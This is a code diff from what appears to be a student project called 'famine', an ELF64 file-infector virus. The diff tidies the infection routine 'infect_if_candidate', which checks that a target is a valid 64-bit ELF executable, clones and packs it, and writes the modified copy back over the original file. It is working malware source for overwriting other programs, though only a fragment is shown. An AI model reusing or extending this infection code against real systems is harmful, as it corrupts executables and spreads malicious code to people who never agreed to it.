@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/07 11:56:00 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/07 12:49:18 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -20,9 +20,7 @@
 static bool	elf64_identifier(const Elf64_Ehdr *hdr, \
 			struct endians_pointer *endians)
 {
-	const char elfmag[4] = {ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3};
-
-	if (ft_memcmp(hdr->e_ident, elfmag, SELFMAG) != 0 // wrong Magic
+	if (ft_memcmp(hdr->e_ident, (char[4]){ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3}, SELFMAG) != 0 // wrong Magic
 	|| hdr->e_ident[EI_CLASS] != ELFCLASS64           // not 64bit
 	|| hdr->e_entry == 0                              // no entry point
 	|| hdr->e_phoff == 0                              // no program hdr table
@@ -41,36 +39,30 @@ inline bool	infect_if_candidate(const char *file)
 	Elf64_Ehdr	elf64_hdr;
 	int		fd = famine_open(file, O_RDONLY);
 
-#ifdef DEBUG
-	char e0[] = {'4','1','\0'};
-	char e1[] = {'4','2','\0'};
-	char e2[] = {'4','3','\0'};
-	char e3[] = {'4','4','\0'};
-#endif
 	if (fd < 0)
 	{
-		return errors(ERR_SYS, e0);
+		return errors(ERR_SYS, '8','1');
 	}
 	if (famine_read(fd, &elf64_hdr, sizeof(elf64_hdr)) < (ssize_t)sizeof(elf64_hdr))
 	{
 		famine_close(fd);
-		return errors(ERR_USAGE, e1);
+		return errors(ERR_USAGE, '8','2');
 	}
 	if (elf64_identifier(&elf64_hdr, &food.endians) == false)
 	{
 		famine_close(fd);
-		return errors(ERR_USAGE, e2);
+		return errors(ERR_USAGE, '8','3');
 	}
 	famine_close(fd);
 
 	if (!original_accessor(&food.original_safe, file))
-		return errors(ERR_THROW, e3);
+		return errors(ERR_THROW, '8','4');
 
 	if (!clone_accessor(&food.clone_safe, food.original_safe.filesize))
-		return errors(ERR_THROW, e3);
+		return errors(ERR_THROW, '8','5');
 
 	if (!elf64_packer(food, food.original_safe.filesize))
-		return errors(ERR_THROW, e3);
+		return errors(ERR_THROW, '8','6');
 
 	write_clone_file(food.clone_safe, file);
 
